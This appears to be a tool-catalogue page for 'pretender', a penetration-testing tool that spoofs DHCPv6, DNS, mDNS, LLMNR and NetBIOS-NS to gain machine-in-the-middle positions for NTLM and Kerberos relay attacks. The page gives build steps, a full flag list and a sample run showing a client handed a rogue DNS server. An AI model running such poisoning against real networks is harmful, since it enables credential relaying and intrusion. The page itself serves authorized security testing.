---
title : "Pretender"
# pre : ' '
description : "Your MitM sidekick for relaying attacks featuring DHCPv6 DNS takeover as well as mDNS, LLMNR and NetBIOS-NS spoofing."
date : 2022-12-27T16:58:33+01:00
# hidden : true
# draft : true
weight : 340
# tags : ['']
---

---

Your MitM sidekick for relaying attacks featuring DHCPv6 DNS takeover as well as mDNS, LLMNR and NetBIOS-NS spoofing.

`pretender` is a tool developed by RedTeam Pentesting to obtain machine-in-the-middle positions via spoofed local name resolution and DHCPv6 DNS takeover attacks. `pretender` primarily targets Windows hosts, as it is intended to be used for relaying attacks but can be deployed on Linux, Windows and all other platforms Go supports. Name resolution queries can be answered with arbitrary IPs for situations where the relaying tool runs on a different host than `pretender`. It is designed to work with tools such as [Impacket's](https://github.com/SecureAuthCorp/impacket) `ntlmrelayx.py` and [krbrelayx](https://github.com/dirkjanm/krbrelayx) that handle the incoming connections for relaying attacks or hash dumping.

Read our [blog post](https://blog.redteam-pentesting.de/2022/introducing-pretender/) for more information about DHCPv6 DNS takeover, local name resolution spoofing and relay attacks.

## Installation

```plain
git clone https://github.com/RedTeamPentesting/pretender
cd pretender
go build
```

## Usage

```plain
./pretender [OPTIONS]
```

## Flags

```plain
  -i, --interface string           Interface to bind on, supports auto-detection by IPv4 or IPv6
  -4, --ip4 ip                     Relay IPv4 address with which queries are answered, supports auto-detection by interface or IPv6
  -6, --ip6 ip                     Relay IPv6 address with which queries are answered, supports auto-detection by interface or IPv4
      --soa-hostname string        Hostname for the SOA record (useful for Kerberos relaying)
      --no-dhcp-dns                Disable DHCPv6 DNS takeover attack (DHCPv6 and DNS)
      --no-dhcp                    Disable DHCPv6 spoofing
      --no-dns                     Disable DNS spoofing
      --no-ra                      Disable router advertisements
      --no-mdns                    Disable mDNS spoofing
      --no-netbios                 Disable NetBIOS-NS spoofing
      --no-llmnr                   Disable LLMNR spoofing
      --no-lnr                     Disable local name resolution spoofing (mDNS, LLMNR, NetBIOS-NS)
      --no-ipv6-lnr                Disable mDNS and LLMNR via IPv6 (useful with allowlist or blocklist)
      --spoof strings              Only spoof these domains, if domain starts with a dot, all subdomains with match (allowlist)
      --dont-spoof strings         Do not spoof these domains, if domain starts with a dot, all subdomains with match (blocklist)
      --spoof-for hosts            Only spoof DHCPv6 and name resolution for these hosts (allowlist of IPs or hostnames)
      --dont-spoof-for hosts       Do not spoof DHCPv6 and name resolution for these hosts (blocklist of IPs or hostnames)
      --spoof-types types          Only spoof these query types (A, AAA, ANY, SOA, all types are spoofed if empty)
      --ignore-nofqdn              Ignore DHCPv6 messages where the client did not include its FQDN (useful with allowlist or blocklists)
      --dry                        Do not spoof name resolution at all, only log queries
  -t, --ttl duration               Time to live for name resolution responses (default 1m0s)
      --lease-lifetime duration    DHCPv6 IP lease lifetime (default 1m0s)
      --router-lifetime duration   Router lifetime specified in router advertisements (default 3m0s)
      --ra-period duration         Time period between router advertisements (default 3m0s)
      --stop-after duration        Stop running after this duration
  -v, --verbose                    Print debug information
      --no-color                   Disables output styling
      --no-timestamps              Disables timestamps in the output
  -l, --log file                   Log file name
      --version                    Print version information
      --no-host-info               Do not gather host information
      --hide-ignored               Do not log ignored queries
      --redirect-stderr            Redirect stderr to stdout
      --interfaces                 List interfaces and their addresses (the other options have no effect, except for --no-color)
```

## Examples

```plain
$ sudo ./pretender -i eth1 --no-ra
Pretender by RedTeam Pentesting built from git commit 69d85ac239
Listening on interface: eth1
IPv4 relayed to: 10.10.20.50
IPv6 relayed to: fe80::e1d8:cf1d:5df3:a7f5

16:50:19 [DHCPv6] listening via UDP on [ff02::1:2%eth1]:547
16:50:19 [mDNS] listening via UDP on [ff02::fb%eth1]:5353
16:50:19 [DNS] listening via TCP on [fe80::e1d8:cf1d:5df3:a7f5%eth1]:53
16:50:19 [mDNS] listening via UDP on 224.0.0.251:5353
16:50:19 [DNS] listening via UDP on [fe80::e1d8:cf1d:5df3:a7f5%eth1]:53
16:50:19 [LLMNR] listening via UDP on [ff02::1:3%eth1]:5355
16:50:19 [NetBIOS] listening via UDP on 10.10.20.255:137
16:50:19 [LLMNR] listening via UDP on 224.0.0.252:5355
16:50:20 [DHCPv6] responding to SOLICIT from fe80::7270:8089:988d:b114 (cl01.offsec.nl) by assigning IPv6 "fe80::8000:800:277e:5926"
16:50:20 [DHCPv6] responding to REQUEST from fe80::7270:8089:988d:b114 (cl01.offsec.nl) by assigning DNS server and IPv6 "fe80::8000:800:277e:5926"
16:50:21 [mDNS] "CL01.local" (ANY) queried by fe80::7270:8089:988d:b114 (cl01.offsec.nl)
16:50:21 [LLMNR] "CL01" (ANY) queried by 10.10.20.61 (cl01.offsec.nl)
16:50:21 [mDNS] "CL01.local" (ANY) queried by 10.10.20.61 (cl01.offsec.nl)
16:50:21 [LLMNR] "CL01" (ANY) queried by fe80::7270:8089:988d:b114 (cl01.offsec.nl, 10.10.20.61)
16:50:21 [mDNS] "CL01.local" (ANY) queried by 10.10.20.61 (cl01.offsec.nl)
16:50:21 [mDNS] "CL01.local" (ANY) queried by fe80::7270:8089:988d:b114 (cl01.offsec.nl, 10.10.20.61)
16:50:21 [LLMNR] "CL01" (ANY) queried by 10.10.20.61 (cl01.offsec.nl)
16:50:21 [LLMNR] "CL01" (ANY) queried by fe80::7270:8089:988d:b114 (cl01.offsec.nl, 10.10.20.61)
16:50:21 [mDNS] "CL01.local" (ANY) queried by fe80::7270:8089:988d:b114 (cl01.offsec.nl, 10.10.20.61)
16:50:21 [mDNS] "CL01.local" (ANY) queried by 10.10.20.61 (cl01.offsec.nl)
16:50:21 [LLMNR] "CL01" (ANY) queried by 10.10.20.61 (cl01.offsec.nl)
16:50:21 [LLMNR] "CL01" (ANY) queried by fe80::7270:8089:988d:b114 (cl01.offsec.nl, 10.10.20.61)
16:50:21 [DNS] "v10.events.data.microsoft.com" (A) queried by fe80::8000:800:277e:5926 (10.10.20.61, PCSSystemtec)
```

## URL list

- [Github.com - Pretender](https://github.com/RedTeamPentesting/pretender)
